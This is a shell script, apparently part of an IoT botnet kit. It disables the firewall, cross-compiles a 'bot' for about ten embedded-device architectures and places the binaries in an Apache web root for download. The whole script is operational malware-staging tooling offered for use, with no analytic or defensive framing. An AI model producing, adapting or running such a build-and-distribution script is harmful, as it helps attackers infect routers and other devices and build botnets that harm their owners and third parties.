ufw disable
cd bot
apt update -y

#setup http server if not installed
       
apt-get install apache2 -y

service apache2 start

# install ubuntu cross compilers (not recommended)
apt install gcc-powerpc64-linux-gnu -y
apt install gcc-mips-linux-gnu -y
apt install gcc-mipsel-linux-gnu -y
apt install gcc-sparc64-linux-gnu -y
apt install gcc-arm-linux-gnueabi -y
apt install gcc-aarch64-linux-gnu -y
apt install gcc-m68k-linux-gnu -y
apt install gcc-i686-linux-gnu -y
apt install gcc-arm-linux-gnueabihf -y

powerpc64-linux-gnu-gcc -w -o powerpc64 -lpthread *.c
mips-linux-gnu-gcc -w -o mips -lpthread *.c
mipsel-linux-gnu-gcc -w -o mipsel -lpthread *.c
sparc64-linux-gnu-gcc -w -o sparc -lpthread *.c
arm-linux-gnueabi-gcc -w -o arm -lpthread *.c
aarch64-linux-gnu-gcc -w -o aarch64 -lpthread *.c
m68k-linux-gnu-gcc -w -o m68k -lpthread *.c
i686-linux-gnu-gcc -w -o i686 -lpthread *.c
arm-linux-gnueabihf-gcc -w -o armhf -lpthread *.c
x86_64-linux-gnu-gcc -w -o x86_64 -lpthread *.c

#move binaries to apache2 dir
mv mipsel mips i686 armhf aarch64 m68k arm sparc powerpc64 x86_64 /var/www/html

cd ..
echo "DONE COMPILING BOT, BINS IN /var/www/html"
echo "THIS COMPILER IS NOT RECOMMENDED"
exit 0
